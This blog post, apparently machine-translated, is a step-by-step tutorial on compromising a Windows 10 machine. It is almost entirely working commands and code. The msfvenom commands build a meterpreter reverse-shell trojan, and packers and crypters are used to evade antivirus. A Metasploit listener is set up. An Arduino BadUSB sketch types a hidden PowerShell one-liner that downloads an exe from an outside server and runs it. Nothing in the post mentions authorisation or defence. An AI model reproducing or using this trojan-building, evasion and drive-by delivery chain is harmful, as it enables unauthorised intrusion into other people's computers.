---
title: 'Metasploit (1): A Walkthrough of Compromising a Win10 Machine'
date: 2020-11-09T11:59:17
categories: [Security]
tags: [internet-security, record, tutorial, msf, badusb]
toc: true
aiTranslated: true
---

In my spare time recently I played around with msf and BadUSB, and pulled off plugging in a "USB stick" to hack into a Windows 10 machine.

<!--more-->

# What Is Metasploit

Metasploit is a free, downloadable framework that makes it very easy to acquire, develop, and exploit vulnerabilities in computer software. It ships with professional-grade exploit tools for hundreds of known software vulnerabilities. When H.D. Moore released Metasploit in 2003, the state of computer security changed forever. Almost overnight, anyone could become a hacker, and everyone could use exploit tools to attack vulnerabilities that were unpatched or had only just been patched. Software vendors could no longer delay releasing patches for publicly disclosed vulnerabilities, because the Metasploit team was constantly developing exploit tools and contributing them to all Metasploit users.

Metasploit was originally designed to be a platform for developing exploit tools, and this book will later explain how to develop them. In practice, however, security professionals and amateur security enthusiasts mostly use it as an environment where a few mouse clicks let you launch successful attacks using its bundled exploit tools.

From [Baidu Baike](https://baike.baidu.com/item/Metasploit/4926164?fr=aladdin)

# Metasploit's Architecture Diagram

![metasploit-framework-pic](/img/msf/metasploit.jpg)

The parts we commonly use are mainly Tools, Modules, and the Console under Interfaces.

Generally, we use msfvenom (under Tools) to set up a payload and generate a trojan program, use social engineering to transfer the trojan onto the target machine and run it, use msfconsole to listen and establish a session, and then work our way into the target machine step by step.

# The Windows 10 Penetration Process

The penetration process:

1. Generate the trojan and upload it to a server (which already has msf installed)
2. Have the server listen
3. Find a way to run the trojan on the target machine (you can use BadUSB)
4. The server establishes a session, allowing you to perform meterpreter penetration operations

## Generate the Trojan with msfvenom

> Venom, in Spider-Man, is a parasite-like alien that can inhabit a host's body and become very powerful.
>
> msfvenom is similar to a parasite: it essentially attaches a payload to a script or an exe program.
>
> A payload is the attack load, mainly used to establish a stable connection between the target and attacker machines and return a shell; it can also do things like process injection.

> Note: if you're not using Kali Linux, you need to install the metasploit environment yourself; look it up.

### A Trojan with No AV-Evasion

```bash
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp lhost=192.168.1.101 lport=4444 -f exe -o /var/www/html/windows.exe
```

-a is the architecture; here we use x86 so it runs on both 32-bit and 64-bit Windows machines.

--platform is the platform; here, windows.

-p is the payload; here, windows/meterpreter/reverse_tcp.

The payload needs lhost and lport, i.e. the IP and port number of the listening machine.

-f is the output format; here, exe.

-o is the output file name; here it's exported to /var/www/html, the default location for port 80, named windows.exe.

This is the most basic command. The trojan it generates is pretty much toast in front of any antivirus, so this approach generally isn't used.

### A Trojan with Modest AV-Evasion, Using an Encoder

```bash
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 10 -b '\x00' lhost=192.168.1.101 lport=4444 -f exe -o /var/www/html/windows.exe
```

Here we additionally use an encoder, x86/shikata_ga_nai.

-e is the encoder.

-i is the number of encoding iterations.

-b specifies characters to remove; here we remove the null byte.

The encoded trojan has improved AV-evasion, but it's still limited.

### A Trojan with Stronger AV-Evasion, by Generating Shellcode and Compiling It Yourself

```bash
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 10 -b '\x00' lhost=192.168.1.101 lport=4444 -f c -o ~/windows.c
```

The command above generates a C file containing a buff array holding the hex representation of the shellcode.

![shellcode](/img/markdown_20201109135223.png)

Then we add a main function to the .c file:

```c
int main()
{
	int (*func)() = (int(*)())buf;
    func();
    return 0;
}
```

We obtain the exe via cross-compilation (since we're generally in a Kali Linux environment).

You may need to install the cross-compilation toolchain first:

```bash
sudo apt-get install g++-mingw-w64-i686
```

Then compile to get the exe file:

```bash
cd ~
i686-w64-mingw32-g++ windows.c -o windows.exe
```

```bash
cd /usr/share/windows-resources/hyperion
wine hyperion.exe -v ~/windows_upxed.exe ~/windows_upxed_hyperioned.exe
```

The exe trojan obtained so far has fairly strong AV-evasion, though it might still get caught.

### A Trojan with Very Strong AV-Evasion, via Packers and Crypters

#### UPX Packer

Use UPX to add a packing layer:

```bash
sudo upx windows.exe -o windows-upxed.exe
```

This gives us a packed trojan, windows-upxed.exe.

If you're not on Kali and don't have upx, install it and then run the command above:

```bash
sudo apt-get install upx
```

#### Hyperion Crypter

Kali ships with hyperion.exe, located in `/usr/share/windows-resources/hyperion/`, but Kali doesn't ship with Wine, so we need to install Wine:

```bash
sudo apt-get install wine
```

But testing shows that to run hyperion.exe we also need to install Wine32 (the 32-bit version of Wine):

```bash
sudo dpkg --add-architecture i386
sudo apt-get update
sudo apt-get install wine32
```

If you run into dependency problems:

```bash
sudo apt-get install -f
```

Then try again.

Once the installation finishes, wine32 is in place. Then go into the hyperion directory and run it with wine:

```bash
cd /usr/share/windows-resources/hyperion
sudo wine hyperion.exe -v ~/windows-upxed.exe ~/windows-upxed-hyperioned.exe
```

And then windows-upxed-hyperioned.exe is generated in the ~ directory.

This trojan has now been packed with two layers, UPX and Hyperion, and its AV-evasion is quite strong.

Now we can drop it into `/var/www/html`, and the next step is writing the BadUSB script.

## Start Listening on the Server

Enter the following command to get into msf's command-line mode:

```bash
sudo msfconle
```

Once inside, enter

```bash
use multi/handler
```

Then set the payload

```bash
set payload windows/meterpreter/reverse_tcp
```

Then set lhost and lport

```bash
set lhost 192.168.1.101 
set lport 4444
```

Then you can run it

```bash
run
```

And now you're in listening mode, waiting for the target machine to run the backdoor trojan.

## Writing the BadUSB Code

BadUSB, as the name suggests, is a "bad USB"; it's essentially an HID keyboard-emulation tool.

You can flash code onto it so it automatically emulates keyboard actions. You can use it to download the backdoor trojan from the server and then run it in the background.

My BadUSB is based on the Arduino Leonardo, so in the Arduino IDE the code goes like this:

```cpp
#include <Keyboard.h>
void setup() {//initialize
    Keyboard.begin();//start keyboard communication
    delay(1000);//delay
    Keyboard.press(KEY_LEFT_GUI);//Win key
    delay(100);
    Keyboard.press('r');//R key
    delay(100);
    Keyboard.release(KEY_LEFT_GUI);//release the Win key
    Keyboard.release('r');//release the R key
    Keyboard.press(KEY_CAPS_LOCK);//toggle caps lock to bypass the IME
    Keyboard.release(KEY_CAPS_LOCK);
    Keyboard.println("cmd /c start /min powershell -Command $clnt = new-object System.Net.WebClient;$url= 'http://www.zhangkexuan.cn/123.exe'; $file = 'D:\\123.exe'; $clnt.DownloadFile($url,$file);START D:\\123.exe -WindowStyle hidden");
    delay(100);
    Keyboard.press(KEY_CAPS_LOCK);
    Keyboard.release(KEY_CAPS_LOCK);//restore caps lock
    delay(100);
    Keyboard.end();//end keyboard communication
}

void loop()//loop
{

}
```

After flashing it onto the BadUSB and plugging it into the Win10 machine, a little window flashes and disappears in an instant. If there are no error messages, it has already requested a connection to the host.

> Note: change the url in there to the url of the backdoor program on your own server.

## Further Penetration with meterpreter

I won't go into what you can do; haha: [https://www.cnblogs.com/backlion/p/9484949.html](https://www.cnblogs.com/backlion/p/9484949.html)


